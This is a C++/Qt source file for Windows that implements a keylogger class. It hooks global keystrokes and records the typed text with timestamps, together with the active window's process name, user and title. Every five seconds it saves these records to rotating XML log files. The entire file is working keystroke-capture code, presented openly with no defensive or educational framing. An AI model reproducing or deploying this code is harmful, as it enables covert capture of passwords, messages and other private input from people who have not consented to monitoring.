#include "keylogger.h"

KeyLogger::KeyLogger(QObject *parent) :
    QObject(parent)
{
    try
    {
        m_lastHandle = 0;
        m_limit = 1024 * 500;
        m_path = QCoreApplication::applicationDirPath();

        connect(KeyHook::Instance(),SIGNAL(keyPress(LogEvent*)),this, SLOT(keyPress(LogEvent*)));
        connect(&m_timer,SIGNAL(timeout()),this,SLOT(writeLogs()));
        QDateTime temp = QDateTime::currentDateTime();

    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

KeyLogger::~KeyLogger()
{
    //Flush out the logs
    writeLogs();

    //perform any cleanup
    qDeleteAll(processes);
}

void KeyLogger::start()
{
    try
    {
        m_timer.start(5000);
        KeyHook::Instance()->start();
    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void KeyLogger::stop()
{
    try
    {
        m_timer.stop();
        KeyHook::Instance()->stop();
    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void KeyLogger::setMax(qint64 size)
{
    try
    {
        if(size < 0) size = 1024 * 500;
        m_limit = size;
    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void KeyLogger::setPath(QString path)
{
    try
    {
        m_path = path;
        QFileInfo fi(m_path);

        if(m_path.endsWith("/") || m_path.endsWith("\\"))
        {
            m_path = m_path.mid(0,path.length() - 1);
        }

        if(m_path.isEmpty() || !fi.exists())
        {
            m_path = QCoreApplication::applicationDirPath();
        }

    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void KeyLogger::keyPress(LogEvent *event)
{
    try
    {
        WindowsInfo info;
        LogProcess* process;

        HWND hWND = info.getActiveWindow();
        int currentHandle = (int)hWND;

        //see if the process is in the list
        if(processes.contains(currentHandle))
        {
            //Get the process from the list
            process = processes.value(currentHandle);
            if(!process) throw QString("Could not find process!");
        }
        else
        {
            //Add a new process
            process = new LogProcess(this);
            processes.insert(currentHandle,process);

            DWORD dPID = info.getWindowProcess(hWND);

            //fill in the process information
            process->handle = currentHandle;
            process->process = (int)dPID;
            process->name = info.getWindowName(dPID);
            process->user = info.getWindowOwner(dPID);
            process->title = info.getWindowTitle(hWND);
        }

        //Add the event to the process
        event->setParent(process);
        process->events.append(event);

        //qDebug() << "Key press: " << event->text;

        //Set the last handle
        m_lastHandle = currentHandle;

    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void KeyLogger::writeLogs()
{
    try
    {
        //Write the logs to the disk
        if(processes.count() <= 0) return;

        //Determine the log file to write to
        m_file = getLogName();

        QDomDocument document;
        QDomElement root;

        //Load the file if it exists
        QFile file(m_file);
        if(file.exists())
        {
            //Load the document
            if(!file.open(QIODevice::ReadOnly | QIODevice::Text))throw file.errorString();

            if(!document.setContent(&file)) throw QString("Could not load the document!");
            file.close();
            root = document.firstChildElement();

        }
        else
        {
            //Make a blank document
            root = document.createElement("processes");
            document.appendChild(root);
        }

        //Update the document
        QDomNodeList processList = root.elementsByTagName("process");

        foreach(LogProcess* process, processes.values())
        {
            if(updateProcessNode(process,root, processList,document) == false)
            {
                //add the node
                addProcessNode(process,root,document);
            }
        }


        //Clear the process events
        qDeleteAll(processes);
        processes.clear();

        //Save the document to the disk
        qDebug() << "Writting key log file: " << m_file;
        if(!file.open(QIODevice::WriteOnly | QIODevice::Text)) throw file.errorString();
        QTextStream stream(&file);
        stream << document.toString();
        file.close();

    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void KeyLogger::handleError(QString error)
{
    qCritical() << error;
}

QString KeyLogger::getLogName()
{
    try
    {
        //Determine the log file to write to
        QString filename = m_file;
        QFileInfo fi(filename);


        //See if we need to make a new file
        if(m_file.isEmpty() || fi.exists() == false || fi.size() > m_limit)
        {
            filename = m_path + "/keylog_" + QString::number(QDateTime::currentDateTime().toMSecsSinceEpoch()) + ".xml";
        }

        return filename;
    }
    catch(QString error)
    {
        handleError(error);
        return m_path + "/keylog.xml";
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return m_path + "/keylog.xml";
    }
}

bool KeyLogger::updateProcessNode(LogProcess* process, QDomElement &root, QDomNodeList &processList, QDomDocument &document)
{
    try
    {

        //Find the process in the list
        for(int i = 0; i < processList.count(); i++)
        {
            //make sure it is an element and convert it
            QDomNode node = processList.at(i);
            if(!node.isElement()) continue;
            QDomElement element = node.toElement();

            //Make sure it matches the process
            if(element.attribute("name") == process->name && element.attribute("title") == process->title && element.attribute("user") == process->user)
            {
                //update the element with the process events
                addProcessEvents(process,element,document);
                return true;
            }
        }

        return false;
    }
    catch(QString error)
    {
        handleError(error);
        return false;
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
        return false;
    }
}

void KeyLogger::addProcessNode(LogProcess* process, QDomElement &root,QDomDocument &document)
{
    try
    {

        QDomElement elementProcess = document.createElement("process");

        //Set the process attributes
        elementProcess.setAttribute("handle", QString::number(process->handle));
        elementProcess.setAttribute("user", process->user);
        elementProcess.setAttribute("name", process->name);
        elementProcess.setAttribute("title", process->title);

        //Add the process events
        addProcessEvents(process,elementProcess,document);

        //Append the element
        root.appendChild(elementProcess);

    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}

void KeyLogger::addProcessEvents(LogProcess *process, QDomElement &root,QDomDocument &document)
{
    try
    {
        foreach(LogEvent* event, process->events)
        {
            QDomElement elementEvent = document.createElement("event");

            //Set the process attributes

            //Why bother saving this information?
            //elementEvent.setAttribute("key_shift", QString::number(event->key_shift));
            //elementEvent.setAttribute("key_capslock", QString::number(event->key_capslock));
            //elementEvent.setAttribute("key_control", QString::number(event->key_control));
            //elementEvent.setAttribute("key_alt", QString::number(event->key_alt));
            //elementEvent.setAttribute("value", QString::number(event->value));

            elementEvent.setAttribute("text", event->text);
            elementEvent.setAttribute("date", event->date.toString("MM-dd-yyyy hh:mm:ss"));

            //Append the element
            root.appendChild(elementEvent);
        }

        //Clear the process events
        qDeleteAll(process->events);
        process->events.clear();
    }
    catch(QString error)
    {
        handleError(error);
    }
    catch(...)
    {
        handleError("Unknown error in: " + QString(Q_FUNC_INFO));
    }
}
